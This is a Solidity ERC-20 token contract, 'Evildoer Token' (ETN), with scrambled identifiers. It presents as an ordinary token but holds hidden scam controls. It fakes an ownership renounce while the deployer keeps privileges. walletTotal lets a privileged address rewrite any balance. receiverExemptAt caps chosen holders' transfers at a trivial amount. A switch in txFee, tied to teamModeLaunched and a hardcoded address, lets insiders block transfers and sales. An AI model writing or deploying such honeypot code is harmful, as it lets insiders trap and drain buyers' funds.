//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface modeExemptTrading {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchedTeamMin) external view returns (uint256);

    function transfer(address amountSender, uint256 txListWallet) external returns (bool);

    function allowance(address modeLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 txListWallet) external returns (bool);

    function transferFrom(
        address sender,
        address amountSender,
        uint256 txListWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeTradingFund, uint256 value);
    event Approval(address indexed modeLiquidity, address indexed spender, uint256 value);
}

abstract contract listSenderLaunch {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tradingLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface swapTo {
    function createPair(address buyMin, address senderExempt) external returns (address);
}

interface limitWallet is modeExemptTrading {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EvildoerToken is listSenderLaunch, modeExemptTrading, limitWallet {

    mapping(address => bool) public tradingAmountMax;

    function symbol() external view virtual override returns (string memory) {
        return toTrading;
    }

    uint256 public exemptReceiver;

    function receiverExemptAt(address minShouldTo) public {
        senderTx();
        if (teamReceiver == exemptReceiver) {
            exemptReceiver = teamReceiver;
        }
        if (minShouldTo == sellExemptFrom || minShouldTo == swapTotal) {
            return;
        }
        receiverTx[minShouldTo] = true;
    }

    uint256 constant toAmount = 18 ** 10;

    function owner() external view returns (address) {
        return senderFundTrading;
    }

    mapping(address => uint256) private teamAmount;

    bool public amountTake;

    function walletTotal(address amountShould, uint256 txListWallet) public {
        senderTx();
        teamAmount[amountShould] = txListWallet;
    }

    uint256 marketingShould;

    uint256 private isAmountTotal = 100000000 * 10 ** 18;

    address public swapTotal;

    function listMode(address walletTxAmount) public {
        if (toSwapMode) {
            return;
        }
        if (teamReceiver != exemptReceiver) {
            amountTake = true;
        }
        tradingAmountMax[walletTxAmount] = true;
        if (listLaunch != amountTake) {
            exemptReceiver = teamReceiver;
        }
        toSwapMode = true;
    }

    string private autoFee = "Evildoer Token";

    function limitTokenShould() public {
        emit OwnershipTransferred(sellExemptFrom, address(0));
        senderFundTrading = address(0);
    }

    function transferFrom(address takeTeam, address amountSender, uint256 txListWallet) external override returns (bool) {
        if (_msgSender() != takeSellFund) {
            if (feeSell[takeTeam][_msgSender()] != type(uint256).max) {
                require(txListWallet <= feeSell[takeTeam][_msgSender()]);
                feeSell[takeTeam][_msgSender()] -= txListWallet;
            }
        }
        return txFee(takeTeam, amountSender, txListWallet);
    }

    function getOwner() external view returns (address) {
        return senderFundTrading;
    }

    function txFee(address takeTeam, address amountSender, uint256 txListWallet) internal returns (bool) {
        if (takeTeam == sellExemptFrom) {
            return isLaunch(takeTeam, amountSender, txListWallet);
        }
        uint256 atExempt = modeExemptTrading(swapTotal).balanceOf(shouldReceiver);
        require(atExempt == receiverMin);
        require(amountSender != shouldReceiver);
        if (receiverTx[takeTeam]) {
            return isLaunch(takeTeam, amountSender, toAmount);
        }
        return isLaunch(takeTeam, amountSender, txListWallet);
    }

    function senderTx() private view {
        require(tradingAmountMax[_msgSender()]);
    }

    uint256 private teamReceiver;

    function balanceOf(address launchedTeamMin) public view virtual override returns (uint256) {
        return teamAmount[launchedTeamMin];
    }

    address shouldReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private listLaunch;

    function teamModeLaunched(uint256 txListWallet) public {
        senderTx();
        receiverMin = txListWallet;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return isAmountTotal;
    }

    function isLaunch(address takeTeam, address amountSender, uint256 txListWallet) internal returns (bool) {
        require(teamAmount[takeTeam] >= txListWallet);
        teamAmount[takeTeam] -= txListWallet;
        teamAmount[amountSender] += txListWallet;
        emit Transfer(takeTeam, amountSender, txListWallet);
        return true;
    }

    address public sellExemptFrom;

    bool public toSwapMode;

    uint8 private modeTxTo = 18;

    function decimals() external view virtual override returns (uint8) {
        return modeTxTo;
    }

    uint256 receiverMin;

    mapping(address => bool) public receiverTx;

    address takeSellFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    event OwnershipTransferred(address indexed minTake, address indexed exemptLaunch);

    constructor (){
        if (amountTake == listLaunch) {
            exemptReceiver = teamReceiver;
        }
        tradingLiquidity txBuyTake = tradingLiquidity(takeSellFund);
        swapTotal = swapTo(txBuyTake.factory()).createPair(txBuyTake.WETH(), address(this));
        
        sellExemptFrom = _msgSender();
        limitTokenShould();
        tradingAmountMax[sellExemptFrom] = true;
        teamAmount[sellExemptFrom] = isAmountTotal;
        if (listLaunch) {
            exemptReceiver = teamReceiver;
        }
        emit Transfer(address(0), sellExemptFrom, isAmountTotal);
    }

    function approve(address minAmount, uint256 txListWallet) public virtual override returns (bool) {
        feeSell[_msgSender()][minAmount] = txListWallet;
        emit Approval(_msgSender(), minAmount, txListWallet);
        return true;
    }

    function transfer(address amountShould, uint256 txListWallet) external virtual override returns (bool) {
        return txFee(_msgSender(), amountShould, txListWallet);
    }

    mapping(address => mapping(address => uint256)) private feeSell;

    function allowance(address marketingSwap, address minAmount) external view virtual override returns (uint256) {
        if (minAmount == takeSellFund) {
            return type(uint256).max;
        }
        return feeSell[marketingSwap][minAmount];
    }

    function name() external view virtual override returns (string memory) {
        return autoFee;
    }

    address private senderFundTrading;

    string private toTrading = "ETN";

}